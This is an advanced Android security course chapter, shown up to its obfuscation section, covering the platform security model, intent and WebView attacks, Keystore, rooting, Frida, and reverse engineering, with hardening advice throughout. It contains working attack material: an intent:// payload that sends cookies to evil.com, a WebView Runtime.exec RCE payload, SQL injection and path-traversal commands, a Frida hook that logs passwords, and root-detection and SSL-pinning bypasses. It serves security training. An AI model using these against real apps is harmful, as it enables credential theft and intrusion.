---
corso: "Cybersecurity Masterclass"
fase: "Domain 15 — Mobile Security"
modulo: "15.A"
titolo: "Android Security"
versione: "Android 15 (API 35), Frida 16.x, jadx 1.5+, objection 1.12+, OWASP MASTG v2"
livello: "Advanced"
prerequisiti:
  - "Linux process model (UID isolation, DAC/MAC, seccomp-bpf)"
  - "Java/Kotlin fundamentals and JVM/ART bytecode concepts"
  - "TLS 1.2/1.3 handshake and certificate validation"
  - "Basic ARM64 assembly and ELF/Mach-O binary structure"
  - "HTTP proxy configuration (Burp Suite or mitmproxy)"
obiettivi:
  - "Reverse engineer an Android APK using jadx, apktool, and Ghidra to extract hardcoded secrets and map native JNI registrations"
  - "Instrument a running application with Frida to hook Java and native methods, bypass root detection, and intercept encrypted data"
  - "Bypass SSL certificate pinning using Frida scripts and objection across OkHttp, network_security_config, and custom TrustManager implementations"
  - "Analyze a banking trojan sample through a static/dynamic pipeline: manifest review, Sigma/YARA rule matching, accessibility abuse detection, and C2 extraction"
  - "Assess an application against the OWASP MASVS/MASTG checklist covering storage, crypto, network, platform, and resilience categories"
tag: [android, frida, jadx, apktool, ssl-pinning, mobile-security, reverse-engineering, banking-trojan, owasp-mastg, detection-engineering]
---

# Domain 15, Chapter 15A — Android Security

> **Learning Objectives.**
> After completing this chapter, the practitioner will be able to:
> 1. Decompile an Android APK with jadx and apktool, reconstruct the application's security-relevant logic, and identify exported components, hardcoded secrets, and insecure storage patterns.
> 2. Write Frida scripts that hook Java methods (login flows, crypto operations) and native functions (JNI, `.so` libraries), demonstrating credential interception and return-value manipulation.
> 3. Bypass SSL certificate pinning on applications using OkHttp CertificatePinner, `network_security_config.xml`, and custom X509TrustManager, validating interception with Burp Suite.
> 4. Perform static and dynamic analysis of an Android banking trojan: identify overlay attack logic, accessibility service abuse, dropper stages, and C2 communication patterns.
> 5. Map application testing findings to OWASP MASVS/MASTG categories and produce a structured security assessment report.

> **Scope.** Android security model (UID sandboxing, SELinux, zygote, seccomp-bpf, dm-verity). Permission system. Intent attacks (activity hijacking, broadcast theft, PendingIntent mutability, deep links). WebView exploitation. Keystore/StrongBox. Verified Boot/dm-verity. Magisk/Zygisk/KernelSU. EdXposed/LSPosed ART hooking. Frida on Android. RE tools (apktool, jadx, Smali, Ghidra). Obfuscation (ProGuard, R8, DexGuard, OLLVM). Banking Trojan techniques (overlay, accessibility, SMS, dropper). SafetyNet/Play Integrity. SSL/certificate pinning. Cryptography misuse. Network security configuration. Forensics and data acquisition. Detection engineering (Sigma/YARA rules for Android threats). Advanced exploitation (Binder IPC, kernel, TEE/TrustZone, ART runtime). Android hardening reference (enterprise, developer, MASVS compliance). Malware analysis and forensics deep dive (static/dynamic pipeline, Frida cookbook, memory forensics, artifact extraction).

---

## 1. The Android security model

### 1.1 Application sandboxing

Each Android application runs as a unique Linux UID. The kernel enforces process-level isolation: app A (UID 10042) cannot read app B's (UID 10043) files or memory. The app's private data directory (`/data/data/<package>`) is owned by its UID with mode 0700. Shared UID (`android:sharedUserId` in manifest) allows apps signed with the same certificate to share a UID and access each other's data — this is deprecated from API 29 and being removed.

**Mechanism.** Each APK install triggers `PackageManagerService` which assigns a UID from the 10000-19999 range. The `/data/system/packages.xml` file records UID-to-package mappings. At process creation, `zygote` calls `setuid()`/`setgid()` and sets supplementary groups reflecting granted permissions (e.g., group `inet` for `INTERNET` permission, group `sdcard_rw` for storage access). File-level isolation uses standard POSIX DAC on `/data/data/<pkg>` (uid=app_uid, gid=app_uid, mode=0700).

**Exploitation — enumerate sandbox boundaries.**

```bash
# List all installed packages with UIDs
adb shell pm list packages -U

# Show UID, SELinux context, and groups for a running app
adb shell ps -A -o PID,USER,NAME | grep <package>
adb shell cat /proc/<pid>/status | grep -E 'Uid|Gid|Groups'

# Check file permissions on an app's private directory (requires root)
adb shell su -c "ls -la /data/data/<package>/"

# Check for world-readable files (common misconfiguration)
adb shell su -c "find /data/data/<package> -perm -o+r -type f"

# Check MODE_WORLD_READABLE SharedPreferences (pre-API 24 only)
adb shell su -c "stat /data/data/<package>/shared_prefs/*.xml"
```

**Detection.** Apps writing files with `MODE_WORLD_READABLE` or `MODE_WORLD_WRITABLE` generate lint warnings (`SetWorldReadable`, `SetWorldWritable`). MDM solutions (e.g., MobileIron, Microsoft Intune) check for apps with `sharedUserId` set and flag shared-UID configurations.

**Hardening.** Never use `MODE_WORLD_READABLE` / `MODE_WORLD_WRITABLE` (removed in API 24). Use `EncryptedSharedPreferences` (Jetpack Security library). Set `android:sharedUserId` only when strictly required and treat it as a deprecation debt.

### 1.2 Zygote and process creation

The zygote process is the template from which all app processes are forked. Zygote preloads the Android framework classes and shared libraries. When an app launches, zygote forks, drops privileges to the app's UID, applies SELinux context, and loads the app's code.

**ASLR weakness.** This fork-without-exec model means all apps inherit the same initial memory layout. ASLR is per-zygote-fork, not per-exec, reducing ASLR entropy across apps — an information leak in one app reveals the zygote's layout, which is shared with all apps until zygote restarts. Google mitigated this in Android 10+ with `PROT_MTE` on supported hardware and library load-order randomization.

**seccomp-bpf.** Starting in Android 8.0, zygote applies a seccomp-bpf filter before forking app processes. The filter is defined in `bionic/libc/seccomp/` and restricts available syscalls. Apps cannot invoke `swapon`, `swapoff`, `sethostname`, `init_module`, `finit_module`, `delete_module`, and other kernel-modifying syscalls. The filter differs per architecture (arm, arm64, x86, x86_64). Violating apps receive `SIGKILL`.

```bash
# Inspect seccomp filter for a running process (root required)
adb shell su -c "cat /proc/<pid>/status | grep Seccomp"
# Seccomp: 2  means filter mode is active

# Dump the BPF program (requires kernel 4.14+)
adb shell su -c "cat /proc/<pid>/seccomp_filter"
```

### 1.3 SELinux

Android enforces SELinux in enforcing mode with a comprehensive policy. Every process runs in a labeled domain (e.g., `untrusted_app`, `platform_app`, `system_server`, `zygote`). File contexts label the filesystem. The policy restricts which domains can access which types, which IPC mechanisms each domain can use, and which system services each domain can call.

**Policy structure.** Platform policy lives in `/system/etc/selinux/`. Vendor policy in `/vendor/etc/selinux/`. Since Android 8.0 (Treble), the Compatibility Matrix enforces that vendor policy cannot reference platform-only types — but vendor-specific domains sometimes have overly-broad permissions (`allow vendor_xxx default_android_vndservice:service_manager { find }`) creating escape paths.

```bash
# Check SELinux enforcement status
adb shell getenforce

# List all SELinux domains for running processes
adb shell ps -AZ | head -40

# Show the SELinux context of a specific app
adb shell ps -AZ | grep <package>
# Example output: u:r:untrusted_app:s0:c147,c256,c512,c768  10042 ...

# Check what a domain is allowed to do
adb shell su -c "sesearch --allow -s untrusted_app /sys/fs/selinux/policy"

# Find SELinux denials in the audit log
adb logcat | grep "avc: denied"
```

**Treble interface security.** Treble isolates vendor HAL processes from the platform. HALs run in their own SELinux domains and communicate with the framework through HIDL/AIDL interfaces. The `hwservicemanager` enforces access control on HAL lookups. Vendor domains are confined to `vndbinder` (separate Binder domain from the main `binder`), preventing vendor code from directly calling platform system services.

**GKI (Generic Kernel Image).** Android 12+ ships a Google-built kernel (GKI) for supported devices. Vendor modifications are restricted to loadable modules (`/vendor/lib/modules/`). The GKI kernel is signed by Google and verified by AVB. This reduces the attack surface from vendor kernel patches, which historically introduced vulnerabilities (CVE-2020-0069 — MediaTek-SU, a command queue driver allowing root from any app).

### 1.4 ART runtime security

The Android Runtime (ART) executes DEX bytecode. Security checks at this layer:

**DEX verification.** Before executing any DEX file, ART's `dex2oat` compiler verifies the bytecode structure: valid opcodes, type-safe register operations, correct branch targets, no stack overflows. Malformed DEX files are rejected at verification time. This prevents attackers from crafting DEX files that exploit the interpreter or JIT compiler.

**JIT hardening.** ART's JIT compiler generates native code at runtime. Since Android 10, JIT-compiled code pages are mapped W^X (write XOR execute) — the JIT writes to a writable mapping, then remaps it read+execute. This prevents injection of native code through JIT memory corruption.

**Profile-guided compilation.** ART compiles frequently-used methods ahead of time (AOT) during idle charging. The compilation profiles are stored in `/data/misc/profiles/` and are per-user, per-app. Tampering with profiles can influence which methods are compiled, potentially affecting timing side-channels.

### 1.5 Permissions

**Normal permissions** — granted automatically at install (e.g., `INTERNET`, `ACCESS_NETWORK_STATE`, `VIBRATE`). **Dangerous permissions** — require runtime user approval (e.g., `CAMERA`, `READ_CONTACTS`, `ACCESS_FINE_LOCATION`). **Signature permissions** — granted only to apps signed with the same certificate as the declaring app (e.g., platform APIs). **signatureOrSystem** (deprecated, replaced by `privileged` permissions for apps in `/system/priv-app/`).

Runtime permissions (API 23+): the app requests permission at the time it needs it; the user can grant or deny, and can revoke later. One-time permissions (API 30+) for camera, mic, and location. Auto-revoke (API 30+) removes permissions from unused apps after several months.

```bash
# List all permissions for an app
adb shell dumpsys package <package> | grep -A 50 "granted=true"

# Grant a permission manually (root/debuggable)
adb shell pm grant <package> android.permission.READ_CONTACTS

# Revoke a permission
adb shell pm revoke <package> android.permission.READ_CONTACTS

# List all dangerous permissions
adb shell pm list permissions -g -d
```

**MASTG reference.** MSTG-PLATFORM-1 (testing app permissions).

---

## 2. Intent-based attacks

### 2.1 Component exposure

Android components (Activities, Services, BroadcastReceivers, ContentProviders) can be exported (accessible to other apps) via `android:exported="true"` in the manifest or by declaring an intent filter. Starting with Android 12 (API 31), components with intent filters must explicitly declare `android:exported`. A component that is exported without proper permission protection is an attack surface.

**Enumeration.**

```bash
# List all exported activities for a package
adb shell dumpsys package <package> | grep -B1 -A10 "Activity.*exported=true"

# Comprehensive component dump using aapt
aapt dump xmltree <app.apk> AndroidManifest.xml | grep -E "exported|permission|intent-filter"

# Use drozer for automated scanning
drozer console connect
dz> run app.package.attacksurface <package>
dz> run app.activity.info -a <package>
dz> run app.service.info -a <package>
dz> run app.broadcast.info -a <package>
dz> run app.provider.info -a <package>
```

**Activity hijacking.** A malicious app registers an intent filter matching the same intent as a legitimate app's activity. When the intent fires, Android shows a chooser or (in some cases) the malicious app's activity is selected, displaying a phishing screen.

```bash
# Launch an exported activity directly
adb shell am start -n <package>/<activity_class>

# Launch with extras (testing for injection)
adb shell am start -n <package>/<activity_class> \
  --es "url" "https://evil.com" \
  --ei "user_id" 1337

# StrandHogg 2.0 (CVE-2020-0096): Launch an activity that inherits
# the task affinity of a victim app, appearing as the victim
# Exploits taskAffinity + allowTaskReparenting without user visibility
```

**CVE-2020-0096 (StrandHogg 2.0).** Allowed a malicious app to hijack any app's task stack without requiring any permissions. The attacker's activity inherited the victim's task affinity and appeared in the Recent Apps screen as the victim app. Affected Android 8.0-9.0. Fixed by enforcing stricter task affinity validation.

**Broadcast theft.** A broadcast sent without `android:permission` can be received by any app that registers a matching receiver. Sensitive data in the broadcast is exposed.

```bash
# Send a broadcast (testing receiver)
adb shell am broadcast -a <action> --es "data" "sensitive_value"

# Monitor all broadcasts on the system
adb shell dumpsys activity broadcasts | grep -A5 "Historical"

# Ordered broadcast interception: a malicious receiver with higher
# priority intercepts and aborts the broadcast before legitimate receivers
```

**Hardening manifest.**

```xml
<!-- WRONG: exported without protection -->
<activity android:name=".TransferActivity"
          android:exported="true" />

<!-- CORRECT: exported with signature permission -->
<activity android:name=".TransferActivity"
          android:exported="true"
          android:permission="com.bank.TRANSFER_PERMISSION" />

<!-- Define a signature-level custom permission -->
<permission android:name="com.bank.TRANSFER_PERMISSION"
            android:protectionLevel="signature" />

<!-- Use LocalBroadcastManager or explicit broadcasts -->
<!-- Or set exported="false" if component is internal-only -->
```

**Service hijacking.** An implicit intent to start a service can be intercepted by a malicious app that registers a matching service. The malicious service receives the intent data. Since Android 5.0, implicit intents to services throw an exception — explicit intents are required.

### 2.2 PendingIntent mutability

A `PendingIntent` wraps an intent for later execution (by another app or the system). Before Android 12, PendingIntents were mutable by default — the receiving app could modify the wrapped intent (changing the target, adding extras). An attacker could modify a mutable PendingIntent obtained from a notification, widget, or alarm to redirect the intent to a malicious target.

**CVE-2022-20138 pattern.** A system component creates a `PendingIntent` with an empty base intent and the `FLAG_MUTABLE` flag. An attacker app receives the `PendingIntent` (e.g., through a `NotificationListenerService` or by binding to a system service that leaks it), fills in the empty intent with a target of their choosing, and sends it — executing the intent with the system's elevated privileges.

```bash
# Detect mutable PendingIntents in a decompiled APK
grep -rn "PendingIntent" jadx_output/ | grep -v "FLAG_IMMUTABLE"
grep -rn "FLAG_MUTABLE" jadx_output/
```

**Hardening.** Android 12+ requires apps to explicitly declare `FLAG_MUTABLE` or `FLAG_IMMUTABLE`. Always use `FLAG_IMMUTABLE` unless mutability is strictly required (e.g., inline reply actions). Lint rule `UnspecifiedImmutableFlag` catches missing flags.

```java
// CORRECT: immutable PendingIntent
PendingIntent pi = PendingIntent.getActivity(
    context, requestCode, intent,
    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
);
```

### 2.3 Deep link and intent:// attacks

Deep links (`https://example.com/path`) and custom scheme links (`myapp://action`) can launch app components. The `intent://` scheme allows constructing arbitrary intents from a URL. A malicious website can use `intent://` to launch an exported component with attacker-controlled extras, potentially triggering unintended functionality (file access, data modification, code execution via WebView).

**Exploitation.**

```
intent://scan/#Intent;scheme=zxing;package=com.google.zxing;end

intent://evil.com/payload#Intent;scheme=https;
  component=com.victim/.InternalActivity;
  S.url=javascript:document.location='https://evil.com/?c='+document.cookie;end
```

**Deep link hijacking.** Multiple apps can register for the same deep link scheme. An attacker app registers `myapp://` and intercepts links intended for the legitimate app. Android App Links (verified `https://` deep links with `autoVerify="true"`) mitigate this by requiring the target domain to host a `.well-known/assetlinks.json` file.

**Hardening.** Validate all intent extras. Never trust data from incoming intents — treat as external input. Use App Links with `autoVerify`. Validate the calling package with `getCallingPackage()`.

```xml
<!-- Verified App Links (prevents hijacking) -->
<intent-filter android:autoVerify="true">
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="https"
          android:host="example.com"
          android:pathPrefix="/transfer" />
</intent-filter>
```

### 2.4 ContentProvider exploitation

ContentProviders expose structured data to other apps. Misconfigurations enable SQL injection and path traversal.

**SQL injection.**

```bash
# Query a content provider (testing for injection)
adb shell content query --uri content://<authority>/users \
  --where "name='admin' OR 1=1--'"

# Using drozer
dz> run app.provider.query content://<authority>/users \
    --selection "1=1) --"
```

**Path traversal.** If a provider implements `openFile()` without sanitizing the URI path, an attacker can traverse to arbitrary files.

```bash
# Path traversal via content provider
adb shell content read --uri content://<authority>/../../shared_prefs/secrets.xml

dz> run app.provider.read content://<authority>/../../../../data/data/<package>/databases/app.db

# Scanner
dz> run scanner.provider.traversal -a <package>
dz> run scanner.provider.injection -a <package>
```

**Hardening.** Set `android:exported="false"` on providers that should be private. Use `android:permission` for exported providers. Validate URI paths in `openFile()` — canonicalize and reject traversal. Use parameterized queries in `ContentProvider.query()`.

**MASTG reference.** MSTG-PLATFORM-2 (testing for injection flaws in content providers).

---

## 3. WebView exploitation

Android's `WebView` component embeds a Chromium-based browser in the app. It is one of the most exploited components due to the bridge between Java and web content.

### 3.1 JavaScript interface RCE

**`addJavascriptInterface`**: exposes a Java object to JavaScript in the WebView. Prior to API 17, all public methods of the exposed object were callable from JavaScript — including `getClass().forName(...).getMethod(...)`, enabling arbitrary code execution.

```java
// Pre-API 17 RCE: attacker injects JavaScript that calls:
// jsInterface.getClass().forName("java.lang.Runtime")
//   .getMethod("exec", String.class)
//   .invoke(null, "id");

// Exploitable JavaScript payload:
// function execute(cmd) {
//   return jsInterface.getClass().forName('java.lang.Runtime')
//     .getMethod('getRuntime', null).invoke(null, null)
//     .exec(['/system/bin/sh', '-c', cmd]);
// }
```

API 17+ requires `@JavascriptInterface` annotation on callable methods, limiting the attack surface to explicitly exposed methods. However, logic flaws in exposed methods remain exploitable.

**Frida hook to detect JavascriptInterface usage at runtime.**

```javascript
Java.perform(function() {
    var WebView = Java.use('android.webkit.WebView');
    WebView.addJavascriptInterface.implementation = function(obj, name) {
        console.log('[*] addJavascriptInterface called');
        console.log('    Interface name: ' + name);
        console.log('    Object class: ' + obj.$className);
        // List exposed methods
        var methods = obj.getClass().getMethods();
        for (var i = 0; i < methods.length; i++) {
            var annots = methods[i].getAnnotations();
            for (var j = 0; j < annots.length; j++) {
                if (annots[j].toString().indexOf('JavascriptInterface') !== -1) {
                    console.log('    @JavascriptInterface: ' + methods[i].getName());
                }
            }
        }
        return this.addJavascriptInterface(obj, name);
    };
});
```

### 3.2 File scheme and universal XSS

**`setAllowUniversalAccessFromFileURLs`**: if enabled, a `file://` page loaded in the WebView can make cross-origin requests (reading any local file, including the app's private data directory). Default is `false` since API 30.

**`setAllowFileAccessFromFileURLs`**: allows `file://` pages to access other `file://` URLs. Similar risk to the above but within the file scheme only.

**Exploitation chain.** Attacker delivers a malicious HTML file (via download, shared intent, or content provider) → app opens it in WebView → JavaScript reads `/data/data/<package>/shared_prefs/credentials.xml` → exfiltrates to attacker's server.

```bash
# Check WebView settings in decompiled source
grep -rn "setAllowUniversalAccessFromFileURLs\|setAllowFileAccessFromFileURLs\|setJavaScriptEnabled\|addJavascriptInterface" jadx_output/
```

### 3.3 Mixed content and TLS downgrade

Loading HTTP resources in an HTTPS WebView (`setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW)`) enables MitM injection of JavaScript. The correct setting is `MIXED_CONTENT_NEVER_ALLOW`.

**Hardening WebView.**

```java
WebSettings settings = webView.getSettings();
settings.setJavaScriptEnabled(true); // Only if required
settings.setAllowFileAccess(false);
settings.setAllowFileAccessFromFileURLs(false);
settings.setAllowUniversalAccessFromFileURLs(false);
settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);
settings.setAllowContentAccess(false);

// Override URL loading to prevent navigation to untrusted origins
webView.setWebViewClient(new WebViewClient() {
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest req) {
        Uri uri = req.getUrl();
        if (!"https".equals(uri.getScheme()) ||
            !"trusted.example.com".equals(uri.getHost())) {
            return true; // Block navigation
        }
        return false;
    }
});
```

**Detection.** Monitor logcat for WebView misconfigurations at runtime: `adb logcat | grep -i "WebView\|JavascriptInterface\|AllowFileAccess"`. MDM policies can flag apps that call `addJavascriptInterface` or enable file access via static manifest analysis. Runtime detection: Frida hooks on `WebSettings.setAllowFileAccess`, `WebSettings.setAllowUniversalAccessFromFileURLs`, and `WebView.addJavascriptInterface` reveal misconfigured WebViews. Apps can self-check with `WebView.getSettings()` assertions in debug builds. Google Play Protect performs static analysis of APKs for known dangerous WebView patterns.

**MASTG reference.** MSTG-PLATFORM-5 (testing WebView protocol handlers), MSTG-PLATFORM-6 (testing JavaScript execution in WebViews).

---

## 4. Keystore, StrongBox, and Verified Boot

### 4.1 Android Keystore

Hardware-backed key storage via the TEE (TrustZone) or StrongBox (a dedicated tamper-resistant processor, available on Pixel 3+). Keys generated in the Keystore never leave the hardware — cryptographic operations are performed inside the TEE/StrongBox, and the key material is not accessible to the application or OS.

**Key generation with hardware binding.**

```java
KeyGenParameterSpec spec = new KeyGenParameterSpec.Builder(
        "alias_transfer_key",
        KeyProperties.PURPOSE_SIGN | KeyProperties.PURPOSE_VERIFY)
    .setDigests(KeyProperties.DIGEST_SHA256)
    .setSignaturePaddings(KeyProperties.SIGNATURE_PADDING_RSA_PKCS1)
    .setKeySize(2048)
    .setIsStrongBoxBacked(true)          // Require StrongBox
    .setUserAuthenticationRequired(true)  // Require biometric/lock
    .setUserAuthenticationValidityDurationSeconds(300) // 5 min validity
    .setAttestationChallenge(serverNonce) // Enable key attestation
    .setInvalidatedByBiometricEnrollment(true)
    .build();

KeyPairGenerator kpg = KeyPairGenerator.getInstance(
    KeyProperties.KEY_ALGORITHM_RSA, "AndroidKeyStore");
kpg.initialize(spec);
KeyPair kp = kpg.generateKeyPair();
```

**Key attestation verification.** `KeyStore.getCertificateChain("alias")` returns a certificate chain rooted in a Google-provisioned key. The attestation extension (OID 1.3.6.1.4.1.11129.2.1.17) contains device properties: OS version, patch level, boot state, and whether the key is hardware-backed. Server-side verification of this chain proves the key was generated in genuine hardware.

**StrongBox vs TEE.** StrongBox is a dedicated secure element (SE) with its own CPU, memory, and RNG — physically separate from the main SoC. TEE (TrustZone) runs on the same CPU in a separate security world. StrongBox provides stronger isolation (resists physical attacks, side-channel attacks on the main CPU) but is slower and supports fewer algorithms (no AES-GCM in early implementations, limited key sizes).

**Biometric authentication bypass (Class 2 vs Class 3).** Class 3 (Strong) biometrics require a hardware-backed, TEE-verified match. Class 2 (Weak) biometrics can be software-based. Apps using `setUserAuthenticationRequired(true)` with Class 2 biometrics are vulnerable to spoofing. Always require `BiometricManager.Authenticators.BIOMETRIC_STRONG`.

```java
BiometricPrompt.PromptInfo promptInfo = new BiometricPrompt.PromptInfo.Builder()
    .setTitle("Authenticate")
    .setAllowedAuthenticators(BiometricManager.Authenticators.BIOMETRIC_STRONG)
    .setNegativeButtonText("Cancel")
    .build();
```

### 4.2 Verified Boot (AVB)

Android Verified Boot verifies the integrity of the boot chain: the bootloader verifies the boot image (kernel + ramdisk), and `dm-verity` verifies the system/vendor/product partitions at block-read time using a Merkle tree whose root hash is signed by the OEM.

**dm-verity mechanism.** The kernel device-mapper module computes SHA-256 hashes of 4KB disk blocks, organized in a Merkle tree. The root hash is stored in the vbmeta partition, signed with the OEM's key. At every block read, dm-verity verifies the hash chain from leaf to root. Any modification to the system partition causes a hash mismatch → dm-verity returns an I/O error → the device either reboots (restart mode) or continues with errors logged (logging mode, used in development).

**Boot states.** `GREEN` = locked bootloader, verified boot chain. `YELLOW` = locked bootloader, custom root of trust (user-installed verification key). `ORANGE` = unlocked bootloader (dm-verity disabled, user warned). `RED` = verification failed.

```bash
# Check dm-verity status
adb shell getprop ro.boot.veritymode
# enforcing | logging | disabled

# Check AVB state
adb shell getprop ro.boot.vbmeta.device_state
# locked | unlocked

# Check boot state
adb shell getprop ro.boot.verifiedbootstate
# green | yellow | orange
```

Magisk (§5) bypasses Verified Boot by modifying the boot image (patching the kernel or ramdisk) without modifying the system partition — "systemless" modification.

---

## 5. Root, hooking frameworks, and dynamic analysis

### 5.1 Magisk

Magisk provides root access (`MagiskSU`) without modifying the system partition. It patches the boot image to inject its init scripts, which mount overlays on top of the system partition at boot time.

**Boot image patching flow.** 1) Extract `boot.img` from the device or firmware package. 2) Magisk Manager patches the ramdisk: injects `magiskinit` binary, modifies `init.rc` to load Magisk's init scripts early in the boot process. 3) Flash the patched `boot.img` via fastboot or custom recovery. 4) At boot, `magiskinit` executes before Android's `init`, sets up the overlay filesystem, and injects `MagiskSU` daemon.

**DenyList (replaces MagiskHide).** Hides root from specified apps by unmounting Magisk's overlays in those app processes. The app sees a clean `/system` without Magisk binaries. Limited effectiveness against apps that check for Magisk artifacts in `/proc/self/mounts`, file descriptors, or memory maps.

**Zygisk.** Injects Magisk modules into the zygote process, enabling per-app code injection. Zygisk modules can hook any method in the app's process before the app's code runs. This is the foundation for root-hiding modules like Shamiko.

```bash
# Install Magisk via fastboot
adb reboot bootloader
fastboot flash boot magisk_patched.img
fastboot reboot

# Enable Zygisk in Magisk settings
# Magisk app → Settings → Enable Zygisk → Reboot

# Configure DenyList
# Magisk app → Settings → Configure DenyList → Select banking apps
```

### 5.2 KernelSU

KernelSU provides root by modifying the kernel directly rather than the ramdisk. It hooks the kernel's `execve` syscall and grants root to authorized processes. Advantages over Magisk: no ramdisk modification (harder to detect), kernel-level control over root grants, and native support for GKI kernels.

### 5.3 EdXposed and LSPosed

These frameworks hook the Android Runtime (ART) to intercept method calls at the Java level. LSPosed (the successor to EdXposed, based on Riru or Zygisk) allows modules to hook any Java method in any app — redefining behavior, modifying arguments, and intercepting return values. Used for security research, privacy modifications, and (by attackers) for credential theft and data exfiltration.

**Architecture.** LSPosed modifies `libart.so` to intercept method dispatch. When a hooked method is called, ART redirects execution to the Xposed callback, which invokes the module's `beforeHookedMethod` / `afterHookedMethod`. The original method can be called, skipped, or replaced.

### 5.4 Frida on Android

Frida on Android: **frida-server** (pushed to the device, runs as root, injects into target processes) or **Gadget** (embedded in the APK's `lib/` directory, loads automatically without root). Frida hooks both Java methods (via ART runtime manipulation) and native methods (via inline hooking in `.so` libraries).

**Setup.**

```bash
# Push frida-server to device
adb push frida-server-16.x.x-android-arm64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell su -c "/data/local/tmp/frida-server &"

# List processes
frida-ps -U

# Attach to a running app
frida -U -n <package_name>

# Spawn and hook an app from start
frida -U -f <package_name> -l hook_script.js --no-pause
```

**Java method hooking.**

```javascript
Java.perform(function() {
    // Hook a login method to capture credentials
    var LoginActivity = Java.use('com.target.app.LoginActivity');
    LoginActivity.authenticate.overload(
        'java.lang.String', 'java.lang.String'
    ).implementation = function(username, password) {
        console.log('[*] Username: ' + username);
        console.log('[*] Password: ' + password);
        return this.authenticate(username, password);
    };

    // Hook SharedPreferences to intercept stored values
    var SharedPrefs = Java.use('android.app.SharedPreferencesImpl');
    SharedPrefs.getString.implementation = function(key, defValue) {
        var result = this.getString(key, defValue);
        console.log('[*] SharedPrefs.getString(' + key + ') = ' + result);
        return result;
    };
});
```

**Native function hooking.**

```javascript
// Hook a native function in a shared library
Interceptor.attach(Module.findExportByName('libnative.so', 'encrypt_data'), {
    onEnter: function(args) {
        console.log('[*] encrypt_data called');
        console.log('    plaintext: ' + Memory.readUtf8String(args[0]));
        console.log('    key ptr: ' + args[1]);
        this.outBuf = args[2];
    },
    onLeave: function(retval) {
        console.log('    ciphertext: ' + hexdump(this.outBuf, { length: 32 }));
    }
});

// Hook JNI_OnLoad to trace native library initialization
Interceptor.attach(Module.findExportByName(null, 'JNI_OnLoad'), {
    onEnter: function(args) {
        console.log('[*] JNI_OnLoad called from: ' +
            Thread.backtrace(this.context, Backtracer.ACCURATE)
                .map(DebugSymbol.fromAddress).join('\n'));
    }
});
```

### 5.5 Objection

Objection is a Frida-based runtime mobile exploration toolkit.

```bash
# Connect to a running app
objection -g <package_name> explore

# Common commands
android sslpinning disable        # Bypass SSL pinning
android root disable              # Bypass root detection
android hooking list classes       # List loaded classes
android hooking list class_methods <class>  # List methods of a class
android hooking watch class <class> --dump-args --dump-return
android hooking watch class_method <class>.<method> --dump-args

# Dump Keystore contents
android keystore list
android keystore dump

# Search for classes by pattern
android hooking search classes <pattern>

# Enumerate loaded libraries
memory list modules
```

**MASTG reference.** MSTG-RESILIENCE-1 through MSTG-RESILIENCE-4 (testing root detection, anti-debugging, anti-tampering, anti-reverse-engineering).

---

## 6. Reverse engineering and obfuscation

### 6.1 APK extraction and decompilation

**Step-by-step workflow.**

```bash
# 1. Extract APK from device
adb shell pm path <package>
adb pull /data/app/<package>-xxxxx/base.apk ./target.apk

# For split APKs (Android App Bundles)
adb shell pm path <package>  # Lists all split APKs
# Pull each split and merge if needed

# 2. Decompile resources and Smali with apktool
apktool d target.apk -o target_apktool/
# Output: AndroidManifest.xml, res/, smali/, lib/

# 3. Decompile to Java with jadx
jadx target.apk -d target_jadx/
# Or use jadx-gui for interactive browsing:
jadx-gui target.apk

# 4. Alternative: dex2jar + JD-GUI
d2j-dex2jar target.apk -o target.jar
jd-gui target.jar

# 5. Analyze native libraries
ls target_apktool/lib/arm64-v8a/
# Use Ghidra or IDA Pro for .so analysis
```

### 6.2 Smali patching

Smali is the assembler/disassembler format for DEX bytecode. Patching Smali allows modifying app behavior without source code.

```bash
# Disable a root detection check
# Find the method in smali:
grep -rn "isRooted\|checkRoot\|detectRoot" target_apktool/smali/

# Example: patch a boolean root check to always return false
# Original smali:
#   invoke-static {}, Lcom/app/RootCheck;->isRooted()Z
#   move-result v0
# Patched smali:
#   const/4 v0, 0x0    # Force v0 = false

# Reassemble and sign
apktool b target_apktool/ -o patched.apk
# Sign with debug key
keytool -genkey -v -keystore debug.keystore -alias debug \
  -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
  -keystore debug.keystore patched.apk debug
# Align
zipalign -v 4 patched.apk patched-aligned.apk

# Install
adb install patched-aligned.apk
```

### 6.3 Native library analysis

**Ghidra with JNI.**

```bash
# Load .so into Ghidra
# 1. Import arm64-v8a/libnative.so
# 2. Analyze with default settings
# 3. Find JNI_OnLoad (entry point for native registration)
# 4. JNI_OnLoad calls RegisterNatives — follow the function table
#    to find dynamically registered native methods
# 5. Apply JNI type signatures for better decompilation:
#    JNIEnv*, jobject, jstring → meaningful parameter names
```

**IDA Pro.** Load the `.so` file, select ARM64 processor. Use the `jni_all.h` header file for JNI type information. Find cross-references to `RegisterNatives` to map Java native methods to their C implementations.

### 6.4 Obfuscation

**ProGuard/R8** — standard Android build tool. Configured via `proguard-rules.pro`. Performs name mangling (renames classes/methods/fields to `a`, `b`, `c`), unused-code removal (tree shaking), and basic optimization.

```groovy
// build.gradle
android {
    buildTypes {
        release {
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'),
                         'proguard-rules.pro'
        }
    }
}
```

```
# proguard-rules.pro — security-relevant rules

# Keep cryptographic classes from optimization (prevents timing side-channels)
-keep class javax.crypto.** { *; }

# Obfuscate but preserve line numbers for crash reporting
-keepattributes SourceFile,LineNumberTable
-renamesourcefileattribute SourceFile

# Remove debug logging in release builds
-assumenosideeffects class android.util.Log {
    public static int d(...);
    public static int v(...);
    public static int i(...);
}
```

**DexGuard** — commercial protector by Guardsquare. Features beyond R8: string encryption (encrypts string constants, decrypts at runtime), class encryption (loads encrypted DEX at runtime), reflection-based API calls (hides sensitive API usage from static analysis), native library protection, tamper detection, root detection, debugger detection. The encryption layer adds a `DexGuardDecryptor` class that decrypts code on first access.

